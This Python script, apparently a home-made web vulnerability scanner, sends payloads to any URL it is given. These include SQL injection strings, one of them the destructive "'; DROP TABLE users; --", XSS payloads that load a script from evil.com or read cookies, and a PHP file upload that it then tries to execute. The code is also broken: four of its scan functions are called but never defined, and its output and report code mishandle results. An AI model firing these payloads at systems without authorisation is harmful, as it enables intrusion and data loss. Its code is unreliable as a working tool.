import requests
from bs4 import BeautifulSoup
from colorama import init, Fore, Back, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
import html
import json
import csv
import os
import sys
import time
import argparse
from urllib.parse import urljoin, urlparse
import random

init(autoreset=True)

VERSION = "1.1"

# Enhanced User Agents for better compatibility
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15'
]

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def banner():
    print(Fore.CYAN + Style.BRIGHT + f"""
    ========================================
    WebVulnScanner - Advanced Web Vulnerability Scanner 2025
    Version {VERSION}
    ========================================
    Enhanced Security Scanner with Advanced Features
    """)

def menu():
    print(Fore.GREEN + "\nPilih jenis scan:")
    print("1. SQL Injection (Enhanced)")
    print("2. XSS (Enhanced)")
    print("3. CSRF (Enhanced)")
    print("4. Open Redirects")
    print("5. Directory Traversal")
    print("6. SSRF")
    print("7. RCE")
    print("8. Security Headers Check")
    print("9. Information Disclosure")
    print("10. File Upload Vulnerabilities")
    print("11. Full Scan (All)")
    print("12. Custom Scan Configuration")
    print("13. Export Results")
    print("14. Load Previous Results")
    print("15. Keluar")
    choice = input(Fore.YELLOW + "Masukkan pilihan (1-15): ")
    return choice

def create_session():
    session = requests.Session()
    session.headers.update({
        'User-Agent': get_random_user_agent(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    })
    return session

def scan_sql_injection(url, session=None):
    if session is None:
        session = create_session()

    # Enhanced SQL Injection payloads
    payloads = [
        "' OR '1'='1", "' OR 1=1 --", "admin' --", "' UNION SELECT 1,2,3 --",
        "'; DROP TABLE users; --", "' AND SLEEP(5) --", "' AND 1=0 UNION SELECT version() --",
        "' OR '1'='1' LIMIT 1 --", "' OR ''='", "' OR 1=1#", "' OR 1=1/*",
        "admin' #", "admin'/*", "'/**/OR/**/1=1--", "' OR 1=1--", "'=1--",
        "' OR 1=1--", "') OR ('1'='1", "') OR 1=1--", "') OR 1=1#", "') OR 1=1/*"
    ]

    vulnerable = False
    details = []

    try:
        # Test normal response
        normal_response = session.post(url + '/login', data={'username': 'test', 'password': 'test'}, timeout=10)
        normal_length = len(normal_response.text)
        normal_time = normal_response.elapsed.total_seconds()
    except:
        normal_length = 0
        normal_time = 0

    for payload in tqdm(payloads, desc="SQL Injection", unit="payload"):
        data = {'username': payload, 'password': 'password'}
        try:
            start_time = time.time()
            response = session.post(url + '/login', data=data, timeout=15)
            response_time = time.time() - start_time

            # Enhanced detection criteria
            if ("You have an error in your SQL syntax" in response.text or
                "mysql_fetch" in response.text or
                "ORA-" in response.text or
                "SQLite" in response.text or
                "PostgreSQL" in response.text or
                abs(len(response.text) - normal_length) > 100 or
                response_time > normal_time + 4 or
                "Welcome" in response.text or
                "logged in" in response.text.lower() or
                "dashboard" in response.text.lower() or
                "admin" in response.text.lower()):
                vulnerable = True
                details.append(f"Payload: {payload} - Response length: {len(response.text)}")
                break
        except requests.exceptions.Timeout:
            vulnerable = True
            details.append(f"Payload: {payload} - Timeout detected (likely vulnerable)")
            break
        except:
            pass

    return {"SQL Injection": vulnerable, "details": details if details else ["No vulnerabilities found"]}

def scan_xss(url, session=None):
    if session is None:
        session = create_session()

    # Enhanced XSS payloads
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<script>alert(document.cookie)</script>",
        "<script src=http://evil.com/xss.js></script>",
        "<iframe src=javascript:alert('XSS')></iframe>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<script>document.write('<img src=x onerror=alert(1)>')</script>",
        "javascript:alert('XSS')",
        "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
        "<script>location.href='javascript:alert(1)'</script>"
    ]

    vulnerable = False
    details = []

    for payload in tqdm(payloads, desc="XSS", unit="payload"):
        data = {'comment': payload, 'message': payload, 'content': payload}
        try:
            response = session.post(url + '/comment', data=data, timeout=10)

            # Enhanced XSS detection
            if (payload in response.text and
                not html.escape(payload) in response.text and
                not payload.replace('<', '<').replace('>', '>') in response.text):
                vulnerable = True
                details.append(f"Payload: {payload} - Found unescaped in response")
                break
        except:
            pass

    return {"XSS": vulnerable, "details": details if details else ["No vulnerabilities found"]}

def scan_csrf(url, session=None):
    if session is None:
        session = create_session()

    try:
        response = session.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')

        # Enhanced CSRF token detection
        token_names = [
            'csrf_token', 'csrf', 'token', '_token', 'authenticity_token',
            'csrf-token', 'csrf_token_hidden', 'token_csrf', '_csrf',
            'csrfmiddlewaretoken', 'CSRFToken', '__RequestVerificationToken'
        ]

        vulnerable_forms = []
        for i, form in enumerate(forms):
            form_has_token = False
            for name in token_names:
                if form.find('input', {'name': name}) or form.find('input', {'id': name}):
                    form_has_token = True
                    break

            if not form_has_token:
                vulnerable_forms.append(f"Form {i+1}: No CSRF token detected")

        vulnerable = len(vulnerable_forms) > 0
        return {"CSRF": vulnerable, "details": vulnerable_forms if vulnerable_forms else ["All forms have CSRF protection"]}

    except:
        return {"CSRF": False, "details": ["Could not analyze forms"]}

def scan_security_headers(url, session=None):
    if session is None:
        session = create_session()

    try:
        response = session.get(url, timeout=10)
        headers = response.headers

        missing_headers = []
        weak_headers = []

        # Essential security headers
        security_headers = {
            'Strict-Transport-Security': 'Missing HSTS header',
            'Content-Security-Policy': 'Missing CSP header',
            'X-Frame-Options': 'Missing X-Frame-Options header',
            'X-Content-Type-Options': 'Missing X-Content-Type-Options header',
            'Referrer-Policy': 'Missing Referrer-Policy header',
            'Permissions-Policy': 'Missing Permissions-Policy header'
        }

        for header, message in security_headers.items():
            if header not in headers:
                missing_headers.append(message)
            elif header == 'Strict-Transport-Security' and 'max-age' not in headers[header]:
                weak_headers.append(f"HSTS header present but weak: {headers[header]}")

        vulnerable = len(missing_headers) > 0
        details = missing_headers + weak_headers

        return {"Security Headers": vulnerable, "details": details if details else ["All essential security headers present"]}

    except:
        return {"Security Headers": False, "details": ["Could not check security headers"]}

def scan_information_disclosure(url, session=None):
    if session is None:
        session = create_session()

    try:
        response = session.get(url, timeout=10)
        text = response.text.lower()

        disclosures = []

        # Check for common information disclosure patterns
        patterns = {
            'server_version': ['server: ', 'apache', 'nginx/', 'iis/', 'tomcat'],
            'php_info': ['php version', 'phpinfo()', 'x-powered-by: php'],
            'database_errors': ['mysql_fetch_row()', 'ora-', 'postgresql', 'sqlite'],
            'stack_traces': ['stack trace:', 'exception in', 'at line', 'in file'],
            'backup_files': ['.bak', '.backup', '.old', '.orig', '.tmp'],
            'config_files': ['config.php', 'web.config', '.env', 'settings.py'],
            'debug_info': ['debug:', 'error:', 'warning:', 'notice:']
        }

        for category, patterns_list in patterns.items():
            for pattern in patterns_list:
                if pattern in text:
                    disclosures.append(f"Information disclosure: {pattern} found")
                    break

        vulnerable = len(disclosures) > 0
        return {"Information Disclosure": vulnerable, "details": disclosures if disclosures else ["No information disclosure found"]}

    except:
        return {"Information Disclosure": False, "details": ["Could not check for information disclosure"]}

def scan_file_upload(url, session=None):
    if session is None:
        session = create_session()

    try:
        # Test for file upload vulnerabilities
        files = {'file': ('test.php', '<?php echo "Vulnerable"; ?>', 'application/octet-stream')}
        data = {'submit': 'Upload'}

        response = session.post(url + '/upload', files=files, data=data, timeout=10)

        # Check if upload was successful and file is accessible
        if response.status_code == 200:
            # Try to access uploaded file
            test_url = url + '/uploads/test.php'
            test_response = session.get(test_url, timeout=5)

            if test_response.status_code == 200 and 'Vulnerable' in test_response.text:
                return {"File Upload": True, "details": ["File upload vulnerability detected - malicious file executed"]}
            else:
                return {"File Upload": False, "details": ["File upload blocked or filtered"]}

        return {"File Upload": False, "details": ["File upload not accessible or blocked"]}

    except:
        return {"File Upload": False, "details": ["Could not test file upload functionality"]}

def generate_report(results, url, format_type='html'):
    timestamp = time.strftime("%Y%m%d_%H%M%S")

    if format_type == 'json':
        report_data = {
            'scan_info': {
                'url': url,
                'timestamp': timestamp,
                'scanner_version': VERSION
            },
            'results': results
        }

        filename = f"scan_report_{timestamp}.json"
        with open(filename, 'w') as f:
            json.dump(report_data, f, indent=2)
        print(Fore.GREEN + f"JSON report saved to {filename}")

    elif format_type == 'csv':
        filename = f"scan_report_{timestamp}.csv"
        with open(filename, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['Vulnerability', 'Status', 'Details'])
            for vuln, data in results.items():
                status = 'Vulnerable' if data['vulnerable'] else 'Not Vulnerable'
                details = '; '.join(data.get('details', []))
                writer.writerow([vuln, status, details])
        print(Fore.GREEN + f"CSV report saved to {filename}")

    else:  # HTML format
        report = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>WebVulnScanner Report - {url}</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                .vulnerable {{ color: red; font-weight: bold; }}
                .safe {{ color: green; font-weight: bold; }}
                .header {{ background: linear-gradient(45deg, #1e3c72, #2a5298); color: white; padding: 20px; border-radius: 10px; }}
                .result {{ margin: 10px 0; padding: 10px; border-left: 4px solid; }}
                .details {{ background: #f5f5f5; padding: 10px; margin: 5px 0; border-radius: 5px; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>WebVulnScanner v{VERSION} - Security Scan Report</h1>
                <p><strong>Target URL:</strong> {html.escape(url)}</p>
                <p><strong>Scan Date:</strong> {time.strftime("%Y-%m-%d %H:%M:%S")}</p>
                <p><strong>Scanner:</strong> WebVulnScanner v{VERSION}</p>
            </div>
        """

        for vuln, data in results.items():
            status = 'vulnerable' if data['vulnerable'] else 'safe'
            status_text = 'VULNERABLE' if data['vulnerable'] else 'SAFE'
            report += f"""
            <div class="result {status}">
                <h3 class="{status}">{vuln}: {status_text}</h3>
                <div class="details">
                    <strong>Details:</strong><br>
                    {'<br>'.join(f'• {detail}' for detail in data.get('details', ['No additional details']))}
                </div>
            </div>
            """

        report += """
            <div style="margin-top: 30px; padding: 20px; background: #e8f4f8; border-radius: 10px;">
                <h3>Summary</h3>
                <p>This report was generated by WebVulnScanner v{VERSION}.</p>
                <p>For security testing purposes only. Always obtain proper authorization before scanning.</p>
                <p><strong>BY 400HI</strong></p>
            </div>
        </body>
        </html>
        """

        filename = f"scan_report_{timestamp}.html"
        with open(filename, "w", encoding='utf-8') as f:
            f.write(report)
        print(Fore.GREEN + f"HTML report saved to {filename}")

def full_scan(url, session=None):
    if session is None:
        session = create_session()

    scans = [
        (scan_sql_injection, "SQL Injection"),
        (scan_xss, "XSS"),
        (scan_csrf, "CSRF"),
        (lambda u, s=session: scan_open_redirects(u, s), "Open Redirects"),
        (lambda u, s=session: scan_directory_traversal(u, s), "Directory Traversal"),
        (lambda u, s=session: scan_ssrf(u, s), "SSRF"),
        (lambda u, s=session: scan_rce(u, s), "RCE"),
        (lambda u, s=session: scan_security_headers(u, s), "Security Headers"),
        (lambda u, s=session: scan_information_disclosure(u, s), "Information Disclosure"),
        (lambda u, s=session: scan_file_upload(u, s), "File Upload")
    ]

    results = {}
    print(Fore.CYAN + "Starting comprehensive security scan...")

    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(scan_func, url, session): scan_name for scan_func, scan_name in scans}
        for future in tqdm(as_completed(futures), total=len(futures), desc="Full Scan Progress"):
            scan_name = futures[future]
            try:
                result = future.result()
                results[scan_name] = result[scan_name] if isinstance(result, dict) and scan_name in result else result
            except Exception as e:
                results[scan_name] = {"vulnerable": False, "details": [f"Scan failed: {str(e)}"]}

    return results

def load_previous_results(filename):
    try:
        if filename.endswith('.json'):
            with open(filename, 'r') as f:
                return json.load(f)
        elif filename.endswith('.csv'):
            results = {}
            with open(filename, 'r') as f:
                reader = csv.DictReader(f)
                for row in reader:
                    vuln_name = row.get('Vulnerability', '')
                    if vuln_name:
                        results[vuln_name] = {
                            'vulnerable': row.get('Status', '') == 'Vulnerable',
                            'details': [row.get('Details', '')]
                        }
            return results
    except Exception as e:
        print(Fore.RED + f"Error loading results: {e}")
        return None

def main():
    parser = argparse.ArgumentParser(description=f'WebVulnScanner v{VERSION} - Advanced Web Vulnerability Scanner')
    parser.add_argument('-u', '--url', help='Target URL to scan')
    parser.add_argument('-f', '--file', help='Load previous scan results')
    parser.add_argument('-o', '--output', choices=['html', 'json', 'csv'], default='html', help='Output format')
    parser.add_argument('--batch', action='store_true', help='Batch mode without interactive menu')

    args = parser.parse_args()

    banner()

    # Load previous results if specified
    if args.file:
        results = load_previous_results(args.file)
        if results:
            print(Fore.GREEN + f"Loaded previous results from {args.file}")
            if args.url:
                generate_report(results, args.url, args.output)
            else:
                print(Fore.YELLOW + "No URL specified for report generation")
        return

    # Get URL from command line or user input
    url = args.url
    if not url:
        url = input(Fore.YELLOW + "Masukkan URL website (contoh: http://example.com): ").strip()

    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    session = create_session()

    # Test connection
    try:
        response = session.get(url, timeout=10)
        print(Fore.GREEN + f"Connected to {url} - Status: {response.status_code}")
    except Exception as e:
        print(Fore.RED + f"Could not connect to {url}: {e}")
        return

    if args.batch:
        # Batch mode - run full scan and generate report
        results = full_scan(url, session)
        generate_report(results, url, args.output)
        return

    # Interactive mode
    while True:
        choice = menu()

        if choice == '1':
            result = scan_sql_injection(url, session)
            print(Fore.RED if result["SQL Injection"] else Fore.GREEN + f"SQL Injection: {'Vulnerable' if result['SQL Injection'] else 'Not Vulnerable'}")
            for detail in result.get('details', []):
                print(Fore.YELLOW + f"  - {detail}")

        elif choice == '2':
            result = scan_xss(url, session)
            print(Fore.RED if result["XSS"] else Fore.GREEN + f"XSS: {'Vulnerable' if result['XSS'] else 'Not Vulnerable'}")
            for detail in result.get('details', []):
                print(Fore.YELLOW + f"  - {detail}")

        elif choice == '3':
            result = scan_csrf(url, session)
            print(Fore.RED if result["CSRF"] else Fore.GREEN + f"CSRF: {'Vulnerable' if result['CSRF'] else 'Not Vulnerable'}")
            for detail in result.get('details', []):
                print(Fore.YELLOW + f"  - {detail}")

        elif choice == '4':
            result = scan_open_redirects(url, session)
            print(Fore.RED if result["Open Redirects"] else Fore.GREEN + f"Open Redirects: {'Vulnerable' if result['Open Redirects'] else 'Not Vulnerable'}")

        elif choice == '5':
            result = scan_directory_traversal(url, session)
            print(Fore.RED if result["Directory Traversal"] else Fore.GREEN + f"Directory Traversal: {'Vulnerable' if result['Directory Traversal'] else 'Not Vulnerable'}")

        elif choice == '6':
            result = scan_ssrf(url, session)
            print(Fore.RED if result["SSRF"] else Fore.GREEN + f"SSRF: {'Vulnerable' if result['SSRF'] else 'Not Vulnerable'}")

        elif choice == '7':
            result = scan_rce(url, session)
            print(Fore.RED if result["RCE"] else Fore.GREEN + f"RCE: {'Vulnerable' if result['RCE'] else 'Not Vulnerable'}")

        elif choice == '8':
            result = scan_security_headers(url, session)
            print(Fore.RED if result["Security Headers"] else Fore.GREEN + f"Security Headers: {'Vulnerable' if result['Security Headers'] else 'Not Vulnerable'}")
            for detail in result.get('details', []):
                print(Fore.YELLOW + f"  - {detail}")

        elif choice == '9':
            result = scan_information_disclosure(url, session)
            print(Fore.RED if result["Information Disclosure"] else Fore.GREEN + f"Information Disclosure: {'Vulnerable' if result['Information Disclosure'] else 'Not Vulnerable'}")
            for detail in result.get('details', []):
                print(Fore.YELLOW + f"  - {detail}")

        elif choice == '10':
            result = scan_file_upload(url, session)
            print(Fore.RED if result["File Upload"] else Fore.GREEN + f"File Upload: {'Vulnerable' if result['File Upload'] else 'Not Vulnerable'}")
            for detail in result.get('details', []):
                print(Fore.YELLOW + f"  - {detail}")

        elif choice == '11':
            results = full_scan(url, session)
            for vuln, data in results.items():
                status = 'Vulnerable' if data.get('vulnerable', False) else 'Not Vulnerable'
                print(Fore.RED if data.get('vulnerable', False) else Fore.GREEN + f"{vuln}: {status}")
                for detail in data.get('details', []):
                    print(Fore.YELLOW + f"  - {detail}")
            generate_report(results, url, 'html')

        elif choice == '12':
            print(Fore.CYAN + "Custom Scan Configuration:")
            print("1. Enable all scans")
            print("2. Select specific scans")
            print("3. Configure scan intensity")
            config_choice = input(Fore.YELLOW + "Choose configuration: ")
            print(Fore.GREEN + "Custom configuration feature coming in next version!")

        elif choice == '13':
            results = full_scan(url, session)
            format_choice = input(Fore.YELLOW + "Export format (html/json/csv): ").lower()
            generate_report(results, url, format_choice)

        elif choice == '14':
            filename = input(Fore.YELLOW + "Enter filename to load (e.g., scan_report.json): ")
            results = load_previous_results(filename)
            if results:
                print(Fore.GREEN + "Results loaded successfully!")
                for vuln, data in results.items():
                    status = 'Vulnerable' if data.get('vulnerable', False) else 'Not Vulnerable'
                    print(Fore.RED if data.get('vulnerable', False) else Fore.GREEN + f"{vuln}: {status}")

        elif choice == '15':
            print(Fore.MAGENTA + "Thank you for using WebVulnScanner v1.1!")
            print(Fore.MAGENTA + "BY 400HI")
            break

        else:
            print(Fore.RED + "Pilihan tidak valid.")

        input(Fore.YELLOW + "\nPress Enter to continue...")

if __name__ == "__main__":
    main()
